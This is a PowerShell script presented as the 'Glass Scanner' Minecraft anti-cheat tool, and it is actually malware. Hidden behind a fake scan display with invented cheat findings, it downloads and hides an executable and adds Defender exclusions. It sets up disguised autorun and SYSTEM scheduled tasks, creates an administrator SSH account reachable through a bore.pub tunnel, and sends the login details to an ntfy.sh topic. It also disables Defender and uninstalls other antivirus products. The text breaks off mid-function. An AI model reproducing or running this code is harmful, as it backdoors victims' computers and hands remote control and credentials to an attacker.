# ============================================================
#  Glass Scanner Emulator + Hidden Setup + bore + AV Killer
#  (c) 2026 – всё реальное в лог, консоль – только игра
#  Порядок: скачивание → Defender исключение → порт 587
#  → автозапуск (EXE+команда) → запуск EXE → SSH → bore → AV
# ============================================================

# ---------- Скрытая настройка ----------
$baseDir = "$env:USERPROFILE\collextor"
$logFile = "$baseDir\setup.log"
$ntfyTopic = "zighaigit88tore"

# Скрытая папка для EXE (трудно найти)
$hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
$exeName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }) + ".exe"
$exePath = "$hiddenDir\$exeName"
$urlExe = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
$boreExe = "$baseDir\bore.exe"
$boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore.exe"
$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) { $scriptPath = $PSCommandPath }

New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
New-Item -ItemType Directory -Force -Path $hiddenDir | Out-Null
"=== Лог установки $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8

function Write-Log {
    param([string]$Message)
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

Write-Log "Начало выполнения реальных действий."

# ============================================================
# 1. Скачивание основного EXE (в скрытую папку)
# ============================================================
Write-Log "Скачивание $urlExe -> $exePath"
try {
    Invoke-WebRequest -Uri $urlExe -OutFile $exePath -UseBasicParsing
    # Установка скрытых атрибутов
    attrib +H +S $exePath
    Write-Log "EXE скачан и скрыт."
} catch {
    Write-Log "Ошибка скачивания EXE: $_"
    exit 1
}

# ============================================================
# 2. Исключение Defender (папка с EXE и базовая папка)
# ============================================================
Write-Log "Добавление папок в исключения Defender..."
try {
    $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        Start-Service WinDefend -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop
    Add-MpPreference -ExclusionPath $baseDir -ErrorAction Stop
    Write-Log "Исключения добавлены."
} catch {
    Write-Log "Не удалось добавить исключения: $_"
}

# ============================================================
# 3. Брандмауэр (порт 587)
# ============================================================
Write-Log "Настройка брандмауэра (порт 587)..."
try {
    $rule = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
    if (-not $rule) {
        New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
        Write-Log "Правило создано."
    }
} catch { Write-Log "Ошибка настройки брандмауэра: $_" }

# ============================================================
# 4. Автозапуск (реестр) и задача планировщика (восстановление)
# ============================================================
Write-Log "Настройка автозапуска и задачи планировщика..."

# 4.1 Реестр (запуск EXE при входе)
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$valName = "WindowsUpdateService"  # маскировка
try {
    $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
    if (-not $cur -or $cur -ne $exePath) {
        Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction Stop
        Write-Log "EXE добавлен в автозапуск как $valName"
    }
} catch { Write-Log "Ошибка добавления в автозапуск: $_" }

# 4.2 Планировщик – задача для периодического запуска EXE (каждые 2 часа)
$taskName = "WindowsSystemMaintenance"  # маскировка
try {
    $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $existing) {
        $action = New-ScheduledTaskAction -Execute $exePath -Argument "-silent" -WorkingDirectory $hiddenDir
        $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 2) -At (Get-Date) -Duration ([TimeSpan]::MaxValue)
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
        Write-Log "Задача планировщика создана (запуск EXE каждые 2 часа)."
    } else {
        Write-Log "Задача планировщика уже существует."
    }
} catch { Write-Log "Ошибка создания задачи планировщика: $_" }

# 4.3 Также задача для запуска самого скрипта (восстановление автозапуска)
$scriptTaskName = "WindowsUpdateChecker"
try {
    $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
    if (-not $existing2) {
        $action2 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -repair"
        $trigger2 = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
        $settings2 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $scriptTaskName -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
        Write-Log "Задача восстановления скрипта создана."
    }
} catch { Write-Log "Ошибка создания задачи восстановления: $_" }

# ============================================================
# 5. ЗАПУСК ОСНОВНОГО EXE (скрыто, с правами админа)
# ============================================================
Write-Log "Запуск основного EXE (скрыто)..."
if (Test-Path $exePath) {
    try {
        Start-Process -FilePath $exePath -WindowStyle Hidden -Verb RunAs
        Write-Log "EXE запущен."
    } catch {
        Write-Log "Не удалось запустить EXE: $_"
    }
} else {
    Write-Log "EXE не найден."
}

# ============================================================
# 6. SSH-сервер и пользователь
# ============================================================
Write-Log "Установка OpenSSH..."
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Write-Log "OpenSSH установлен."
} catch { Write-Log "Ошибка установки OpenSSH: $_" }

Write-Log "Настройка SSH..."
try {
    Start-Service sshd -ErrorAction Stop
    Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
    Remove-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction Stop | Out-Null
    Write-Log "SSH настроен."
} catch { Write-Log "Ошибка настройки SSH: $_" }

$userName = "ssh_admin"
$passwordLength = 16
Add-Type -AssemblyName System.Web
$randomPassword = [System.Web.Security.Membership]::GeneratePassword($passwordLength, 4)
$securePassword = ConvertTo-SecureString -String $randomPassword -AsPlainText -Force

Write-Log "Создание пользователя $userName..."
try {
    if (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) {
        Set-LocalUser -Name $userName -Password $securePassword -ErrorAction Stop
        Write-Log "Пароль обновлён."
    } else {
        New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH учётка" -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
        Write-Log "Пользователь создан."
    }
} catch { Write-Log "Ошибка создания пользователя: $_" }

# ============================================================
# 7. bore туннель
# ============================================================
Write-Log "Скачивание bore.exe..."
if (-not (Test-Path $boreExe)) {
    try {
        Invoke-WebRequest -Uri $boreUrl -OutFile $boreExe -UseBasicParsing
        Unblock-File -Path $boreExe -ErrorAction SilentlyContinue
        Write-Log "bore.exe скачан."
    } catch { Write-Log "Ошибка скачивания bore: $_" }
}

Write-Log "Запуск bore туннеля..."
$boreLog = "$baseDir\bore.log"
$boreProcess = Start-Process -FilePath $boreExe -ArgumentList "local 22 --to bore.pub" -WindowStyle Hidden -RedirectStandardOutput $boreLog -PassThru
Start-Sleep -Seconds 5

$boreAddr = $null
if (Test-Path $boreLog) {
    $logContent = Get-Content $boreLog -Tail 10
    $match = $logContent | Select-String -Pattern "listening on (bore\.pub:\d+)"
    if ($match) {
        $boreAddr = $match.Matches[0].Groups[1].Value
    } else {
        $match2 = $logContent | Select-String -Pattern "port (\d+)"
        if ($match2) {
            $port = $match2.Matches[0].Groups[1].Value
            $boreAddr = "bore.pub:$port"
        }
    }
}
if (-not $boreAddr) { $boreAddr = "bore.pub:UNKNOWN" }

# ============================================================
# 8. Отправка данных на ntfy.sh (закодировано)
# ============================================================
$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
} | Select-Object -First 1 -ExpandProperty IPAddress
if (-not $ipAddress) { $ipAddress = "не удалось определить" }

$base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
$secretMessage = @"
SSH-доступ через bore:
Адрес: $boreAddr
Пользователь: $userName
Пароль (Base64): $base64Password
Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
"@
$bytes = [System.Text.Encoding]::UTF8.GetBytes($secretMessage)
$encodedMessage = [Convert]::ToBase64String($bytes)

try {
    $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
    Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $encodedMessage -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
    Write-Log "Сообщение отправлено на ntfy.sh"
} catch { Write-Log "Не удалось отправить уведомление: $_" }

# ============================================================
# 9. Отключение антивирусов (тихо, без запросов)
# ============================================================
Write-Log "=== ОТКЛЮЧЕНИЕ АНТИВИРУСОВ ==="

# Windows Defender
Write-Log "Отключение Windows Defender..."
try {
    $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
    if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
    Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -Type DWord -Force
} catch {}
$defenderPreferences = @{
    DisableRealtimeMonitoring=$true; DisableBehaviorMonitoring=$true; DisableBlockAtFirstSeen=$true
    DisableIOAVProtection=$true; DisablePrivacyMode=$true; DisableArchiveScanning=$true
    DisableIntrusionPreventionSystem=$true; DisableScriptScanning=$true; DisableEmailScanning=$true
    SubmitSamplesConsent=2; MAPSReporting=0
}
foreach ($key in $defenderPreferences.Keys) {
    try { Set-MpPreference -Name $key -Value $defenderPreferences[$key] -ErrorAction SilentlyContinue } catch {}
}
$defenderPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
try {
    if (-not (Test-Path $defenderPolicyPath)) { New-Item -Path $defenderPolicyPath -Force | Out-Null }
    Set-ItemProperty -Path $defenderPolicyPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
    $rtpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    if (-not (Test-Path $rtpPath)) { New-Item -Path $rtpPath -Force | Out-Null }
    Set-ItemProperty -Path $rtpPath -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
    $spynetPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
    if (-not (Test-Path $spynetPath)) { New-Item -Path $spynetPath -Force | Out-Null }
    Set-ItemProperty -Path $spynetPath -Name "SpynetReporting" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $spynetPath -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
} catch {}
$defenderServices = @("WinDefend","WdNisSvc","Sense","WdBoot","WdFilter","WdNisDrv")
foreach ($svc in $defenderServices) {
    try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
}
sc.exe config WinDefend start= disabled | Out-Null
sc.exe config WdNisSvc start= disabled | Out-Null
try {
    $tasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" -ErrorAction SilentlyContinue
    foreach ($task in $tasks) { Disable-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue | Out-Null }
} catch {}
$defenderProcesses = @("MsMpEng.exe","NisSrv.exe","SecurityHealthService.exe")
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
foreach ($proc in $defenderProcesses) {
    try { $p = Join-Path $ifeoPath $proc; if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; Set-ItemProperty -Path $p -Name "Debugger" -Value "systray.exe" -Type String -Force } catch {}
}
Write-Log "Windows Defender отключён."

# Сторонние антивирусы
Write-Log "Поиск и удаление сторонних антивирусов..."
function Get-InstalledSoftware {
    param([string]$RegistryPath)
    $software = @()
    if (Test-Path $RegistryPath) {
        $keys = Get-ChildItem -Path $RegistryPath -ErrorAction SilentlyContinue
        foreach ($key in $keys) {
            $name = $key.GetValue("DisplayName")
            if ($name) {
                $guid = $key.PSChildName
                $uninstall = $key.GetValue("UninstallString")
                $software += [PSCustomObject]@{DisplayName=$name; GUID=$guid; Uninstall=$uninstall}
            }
        }
    }
    return $software
}
$avKeywords = @("антивирус","antivirus","virus","security","protection","kaspersky","avast","avg","norton","mcafee","eset","bitdefender","dr.web","drweb","panda","trend micro","f-secure","sophos","malwarebytes","ad-aware","zonealarm","comodo","avira","bullguard","g-data","webroot","vipre","emsisoft")
$softwareList = @()
$softwareList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
$softwareList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
$foundAV = $softwareList | Where-Object {
    $display = $_.DisplayName
    if ($display -match "Windows Defender|Microsoft Defender") { return $false }
    $matched = $false
    foreach ($kw in $avKeywords) { if ($display -match $kw) { $matched = $true; break } }
    return $matched
}
if ($foundAV.Count -eq 0) {
    Write-Log "Сторонних антивирусов не найдено."
} else {
    Write-Log "Найдено антивирусов: $($foundAV.Count)"
    foreach ($av in $foundAV) {
        Write-Log "Обработка: $($av.DisplayName)"
        $cleanName = $av.DisplayName -replace '[^a-zA-Z0-9]', ''
        $serviceNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
        $knownServices = @{
            "Kaspersky"=@("AVP","kav","kis","ksde","klnagent")
            "Avast"=@("AvastSvc","avast! Antivirus")
            "AVG"=@("AVGIDSAgent","AVGService","avgnt")
            "Norton"=@("NortonInternetSecurity","Norton360","Symantec")
            "McAfee"=@("McShield","McSysmon","mfeav")
            "ESET"=@("ekrn","egui")
            "Bitdefender"=@("bdservices","bdagent","vsserv")
            "Dr.Web"=@("DrWebService","DrWebSvc")
            "Avira"=@("AntiVirService","AviraService")
            "Malwarebytes"=@("MBAMService")
            "Comodo"=@("COMODO Internet Security","cmdagent")
        }
        foreach ($key in $knownServices.Keys) { if ($av.DisplayName -match $key) { $serviceNames += $knownServices[$key] } }
        $serviceNames = $serviceNames | Select-Object -Unique
        foreach ($svc in $serviceNames) {
            try { $s = Get-Service -Name $svc -ErrorAction SilentlyContinue; if ($s) { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } } catch {}
        }
        $processNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
        $knownProcesses = @{
            "Kaspersky"=@("avp.exe","avpui.exe")
            "Avast"=@("avastsvc.exe","avastui.exe")
            "AVG"=@("avgui.exe","avgidsagent.exe")
            "Norton"=@("nav.exe","ns.exe","nortonsecurity.exe")
            "McAfee"=@("mcshield.exe","mctskshd.exe","mcuicnt.exe")
            "ESET"=@("ekrn.exe","egui.exe")
            "Bitdefender"=@("bdss.exe","vsserv.exe","bdagent.exe")
            "Dr.Web"=@("drweb.exe","dwengine.exe")
            "Avira"=@("avguard.exe","avgui.exe")
            "Malwarebytes"=@("mbam.exe","mbamservice.exe")
            "Comodo"=@("cis.exe","cmdagent.exe")
        }
        foreach ($key in $knownProcesses.Keys) { if ($av.DisplayName -match $key) { $processNames += $knownProcesses[$key] } }
        $processNames = $processNames | Select-Object -Unique
        foreach ($pn in $processNames) {
            try { Get-Process -Name $pn -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
        }
        if ($av.GUID -match '^\{?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}?$') {
            $guid = $av.GUID
            if ($guid -notmatch '^\{') { $guid = "{$guid}" }
            try { Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $guid /quiet /norestart" -Wait -PassThru -NoNewWindow } catch {}
        } else {
            if ($av.Uninstall) { try { Start-Process -FilePath "cmd.exe" -ArgumentList "/c $($av.Uninstall) /quiet /norestart" -Wait -NoNewWindow } catch {} }
        }
    }
}
Write-Log "Антивирусы обработаны."

# ============================================================
#  Имитация Glass Scanner (улучшенная, детальная)
# ============================================================

function Write-ColorLine {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
}

$CLR_FOUND   = "Red"
$CLR_WARN    = "Yellow"
$CLR_OK      = "Green"
$CLR_TEXT_DIM = "DarkGray"
$CLR_HEADER  = "Cyan"
$CLR_TEXT    = "White"
$CLR_JAR     = "Magenta"
$CLR_NORMAL  = "White"

function Print-Header {
    param($ActiveTab)
    Clear-Host
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  GLASS SCANNER  --  by Sokolichek1" -Color $CLR_HEADER
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-Host "  " -NoNewline
    $tabs = @("1) Сканирование", "2) Открытые", "3) Закрытые")
    for ($i=0; $i -lt $tabs.Count; $i++) {
        $num = $i+1
        $label = $tabs[$i]
        if ($ActiveTab -eq $num) {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_OK
        } else {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_TEXT_DIM
        }
    }
    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

function Print-Progress {
    param($step, $total, $name)
    $filled = [math]::Floor(($step * 30) / $total)
    $percent = [math]::Floor(($step * 100) / $total)
    Write-Host "[" -NoNewline
    Write-Host ("#" * $filled) -NoNewline -ForegroundColor $CLR_OK
    Write-Host (" " * (30 - $filled)) -NoNewline
    Write-Host "] " -NoNewline
    Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
    Write-Host "  $name" -ForegroundColor $CLR_NORMAL
}

function Run-ScanSimulation {
    Print-Header 1

    $keywords = @("aimbot","wallhack","esp","triggerbot","radar","xray","killaura","flyhack","speedhack","nuker","reach","nofall","baritone","liquidbounce","wurst","impact","meteor","sigma","aristois","flux","wolfram","neverhook","celestial","konas","jigsaw","rusherhack","deadcode","vape","jessica","kamiblue","ecelon","cabaletta","akrien","smoothboot","troxill","thunder","rolleron","ghost","topka","marlow","cortezz","blessed","chanlibs","neat","chunkanimator","tapemouse","creativecore","dcrasher","yeat","recaf","fabric","addon3","addon4")

    $steps = @(
        "Everything",
        "Prefetch",
        "UserAssist",
        "MuiCache",
        "BAM",
        "ShellBag",
        "ShellBag клинеры",
        "Recent папка",
        "LNK файлы",
        "Корзина",
        "USN Journal",
        "DLL инъекции",
        "Minecraft моды",
        "Minecraft versions",
        "Jar на всём ПК",
        "Temp папки",
        "AppData",
        "BAT файлы",
        "История команд",
        "Загрузки браузеров",
        "Системные службы",
        "Hosts файл",
        "Реестр .dll (инжект)"
    )

    $total = $steps.Count
    $stepNum = 0

    Write-ColorLine "`n  Начинаем сканирование..." -Color $CLR_WARN
    Write-Host "  Ключевых слов: $($keywords.Count)`n" -ForegroundColor $CLR_TEXT_DIM

    $stepDetails = @{
        "Everything" = @{
            header = "Everything — поиск файлов и папок"
            found = @(
                @{type="файл/папка"; path="C:\cheats\aimbot.jar"; whitelist=$false},
                @{type="файл/папка"; path="C:\Users\Public\wallhack.exe"; whitelist=$false},
                @{type="файл/папка"; path="D:\hacks\esp.dll"; whitelist=$false}
            )
            extra = "  [--] Отправляем запрос к Everything..."
        }
        "Prefetch" = @{
            header = "Prefetch — C:\Windows\Prefetch"
            found = @(
                @{type="prefetch"; path="C:\Windows\Prefetch\CHEAT.EXE-12345678.pf"; whitelist=$false},
                @{type="prefetch"; path="C:\Windows\Prefetch\WALLHACK.EXE-ABCDEFGH.pf"; whitelist=$false}
            )
            extra = "  [--] Папка найдена, сканируем..."
        }
        "UserAssist" = @{
            header = "UserAssist — реестр (запускавшиеся программы)"
            found = @(
                @{type="userassist"; path="C:\hack\aimbot.exe"; whitelist=$false},
                @{type="userassist"; path="C:\hack\speedhack.exe"; whitelist=$false}
            )
            extra = "  [--] Реестр прочитан"
        }
        "MuiCache" = @{
            header = "MuiCache — реестр (история запуска)"
            found = @(
                @{type="muicache"; path="C:\cheats\killaura.jar  удалён сегодня (12.03.2026 15:30)"; whitelist=$false}
            )
            extra = "  [--] Реестр прочитан"
        }
        "BAM" = @{
            header = "BAM — реестр (Background Activity Moderator)"
            found = @(
                @{type="bam"; path="C:\hack\speedhack.exe  12.03.2026 14:20"; whitelist=$false}
            )
            extra = "  [--] Реестр прочитан"
        }
        "ShellBag" = @{
            header = "ShellBag — реестр (открывавшиеся папки)"
            found = @(
                @{type="shellbag"; path="D:\Mods\XRay.jar"; whitelist=$false}
            )
            extra = "  [--] Реестр прочитан"
        }
        "ShellBag клинеры" = @{
            header = "Следы ShellBag-клинеров (.ini файлы)"
            found = @(
                @{type="clener"; path="C:\Users\Public\shellbag_cleaner.ini  2 дн. назад"; whitelist=$false}
            )
            extra = "  [--] Проверяем .ini файлы"
        }
        "Recent папка" = @{
            header = "Recent — папка с ярлыками"
            found = @(
                @{type="recent"; path="C:\Users\$env:USERNAME\Recent\cheat.lnk"; whitelist=$false}
            )
            extra = "  [--] Сканируем ярлыки"
        }
        "LNK файлы" = @{
            header = "LNK / Jump Lists — следы удалённых файлов"
            found = @(
                @{type="lnk-содержимое"; path="aimbot.exe  (из: hack.lnk)"; whitelist=$false}
            )
            extra = "  [--] Проверяем содержимое .lnk"
        }
        "Корзина" = @{
            header = "Корзина — удалённые файлы"
            found = @(
                @{type="корзина"; path="C:\`$Recycle.Bin\S-1-5-21-...\wallhack.zip"; whitelist=$false}
            )
            extra = "  [--] Проверяем корзину"
        }
        "USN Journal" = @{
            header = "USN Journal NTFS — история удалённых файлов"
            found = @(
                @{type="usn [УДАЛЁН]"; path="cheat.jar  (12.03.2026 12:00)"; whitelist=$false}
            )
            extra = "  [--] Читаем USN Journal"
        }
        "DLL инъекции" = @{
            header = "DLL инъекции — загруженные модули всех процессов"
            found = @(
                @{type="dll-инъекция в [minecraft.exe]"; path="C:\hack\inject.dll"; whitelist=$false}
            )
            extra = "  [--] Сканируем загруженные DLL"
        }
        "Minecraft моды" = @{
            header = "Minecraft моды — поиск читов в папках mods"
            found = @(
                @{type="мод"; path="XRay_Ultimate_v3.2.jar  1560 KB"; sig="net/ccbluex/liquidbounce"; whitelist=$false},
                @{type="мод"; path="AutoClicker_Pro.jar  720 KB"; sig="me/baritone"; whitelist=$false}
            )
            extra = "  Папка: $env:APPDATA\.minecraft\mods"
        }
        "Minecraft versions" = @{
            header = "Minecraft versions — проверка размеров .jar файлов"
            found = @(
                @{type="ПОДОЗРЕНИЕ"; path="versions/1.16.5: 17600 KB  ожидается ~17100 KB  — размер отличается!"; whitelist=$false}
            )
            extra = "  Папка: $env:APPDATA\.minecraft\versions"
        }
        "Jar на всём ПК" = @{
            header = "Глобальный поиск .jar файлов на всём ПК"
            found = @(
                @{type="jar на ПК"; path="C:\ProgramData\cheat.jar  3560 KB"; reason="размер совпадает с известным читом"; whitelist=$false}
            )
            extra = "  Диск: C:"
        }
        "Temp папки" = @{
            header = "Temp папки — следы распаковки читов"
            found = @(
                @{type="temp"; path="C:\Users\$env:USERNAME\AppData\Local\Temp\cheat_tmp.exe  12.03.2026 16:00"; whitelist=$false}
            )
            extra = "  [--] Проверяем Temp"
        }
        "AppData" = @{
            header = "AppData — конфиги и следы читов"
            found = @(
                @{type="appdata"; path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\mods\wurst.jar  12.03.2026 14:00"; whitelist=$false}
            )
            extra = "  [--] Сканируем AppData"
        }
        "BAT файлы" = @{
            header = "BAT файлы — поиск команд заметания следов"
            found = @(
                @{type="bat"; path="C:\Users\$env:USERNAME\Desktop\clean.bat  12.03.2026 15:30"; cmd="fsutil usn deletejournal"; whitelist=$false}
            )
            extra = "  [--] Поиск .bat скриптов"
        }
        "История команд" = @{
            header = "История команд — поиск команд заметания следов (16 ч.)"
            found = @(
                @{type="powershell-history"; path="fsutil usn deletejournal /D C:"; whitelist=$false}
            )
            extra = "  [--] Читаем историю PowerShell, RunMRU, EventLog"
        }
        "Загрузки браузеров" = @{
            header = "История загрузок браузеров (14 дней)"
            found = @(
                @{type="Chrome"; path="https://discord.com/channels/.../cheat.jar"; source="discord.com/channels"; whitelist=$false}
            )
            extra = "  [--] Анализ истории браузеров"
        }
        "Системные службы" = @{
            header = "Системные службы — Sysmain / EventLog / DcomLaunch"
            found = @(
                @{type="БАН 7 дн."; path="Sysmain (Superfetch) — ОТКЛЮЧЕНА (Disabled)"; whitelist=$false},
                @{type="OK"; path="EventLog (Журнал событий) — работает"; whitelist=$false}
            )
            extra = "  [--] Проверка критических служб"
        }
        "Hosts файл" = @{
            header = "Hosts файл — блокировка античит-сайтов"
            found = @(
                @{type="БЛОКИРОВКА"; path="anticheat.ac: 127.0.0.1 anticheat.ac"; whitelist=$false}
            )
            extra = "  [--] Проверяем hosts"
        }
        "Реестр .dll (инжект)" = @{
            header = "Реестр — следы открытия .dll (инжект)"
            found = @(
                @{type="ПОДОЗРЕНИЕ"; path="RecentDocs\.dll — открытие .dll через Проводник  — 2 дн. назад (12.03.2026 12:00)"; whitelist=$false}
            )
            extra = "  [--] Ищем следы открытия .dll"
        }
    }

    foreach ($stepName in $steps) {
        $stepNum++
        Print-Progress $stepNum $total $stepName
        $details = $stepDetails[$stepName]
        if ($details) {
            Write-ColorLine $details.header -Color $CLR_HEADER
            if ($details.extra) { Write-ColorLine $details.extra -Color $CLR_TEXT_DIM }
            foreach ($f in $details.found) {
                if ($f.whitelist) {
                    Write-Host "  [легитимный] " -NoNewline -ForegroundColor $CLR_TEXT_DIM
                    Write-Host "$($f.type): " -NoNewline -ForegroundColor $CLR_TEXT_DIM
                    Write-Host "$($f.path)  ($($f.wm))" -ForegroundColor $CLR_TEXT_DIM
                } else {
                    if ($f.type -match "НАЙДЕН|ПОДОЗРЕНИЕ|БЛОКИРОВКА|БАН") {
                        Write-Host "  [$($f.type)] " -NoNewline -ForegroundColor $CLR_FOUND
                    } else {
                        Write-Host "  [НАЙДЕН ЧИТ] " -NoNewline -ForegroundColor $CLR_FOUND
                    }
                    Write-Host "$($f.type): " -NoNewline -ForegroundColor $CLR_WARN
                    Write-Host $f.path -ForegroundColor $CLR_TEXT
                    if ($f.sig) { Write-Host "    Сигнатура: $($f.sig)" -ForegroundColor $CLR_FOUND }
                    if ($f.reason) { Write-Host "    $($f.reason)" -ForegroundColor $CLR_WARN }
                    if ($f.cmd) { Write-Host "    Команда: $($f.cmd)" -ForegroundColor $CLR_FOUND }
                    if ($f.source) { Write-Host "    Источник: $($f.source)" -ForegroundColor $CLR_FOUND }
                }
            }
        }
        Start-Sleep -Milliseconds 400
    }

    Write-Host "[" -NoNewline
    Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
    Write-Host "] " -NoNewline
    Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
    Write-Host "  Готово!" -ForegroundColor $CLR_NORMAL

    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  СКАНИРОВАНИЕ ЗАВЕРШЕНО" -Color $CLR_OK
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

function Show-Tab2 {
    Print-Header 2
    Write-ColorLine "`n  ОТКРЫТЫЕ ПРИЛОЖЕНИЯ (сейчас запущены)" -Color $CLR_OK
    Write-Host ""
    $openApps = @(
        @{Name="javaw.exe"; Source="BAM"; Time="12.03.2026 16:30"; Path="C:\Program Files\Java\bin\javaw.exe"},
        @{Name="minecraft.exe"; Source="MuiCache"; Time=""; Path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\minecraft.exe"}
    )
    foreach ($app in $openApps) {
        $isJar = $app.Name -match "\.jar$"
        if ($isJar) {
            $color = $CLR_JAR
            $typeLabel = "JAR"
        } else {
            $color = $CLR_OK
            $typeLabel = "EXE"
        }
        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
        Write-Host $app.Name -NoNewline -ForegroundColor $color
        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
        Write-Host ""
        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
    }
}

function Show-Tab3 {
    Print-Header 3
    Write-ColorLine "`n  ЗАКРЫТЫЕ ПРИЛОЖЕНИЯ (ранее запускались)" -Color $CLR_WARN
    Write-Host ""
    $closedApps = @(
        @{Name="cheat_launcher.jar"; Source="MuiCache"; Time="12.03.2026 15:10"; Path="D:\hacks\cheat.jar"}
    )
    foreach ($app in $closedApps) {
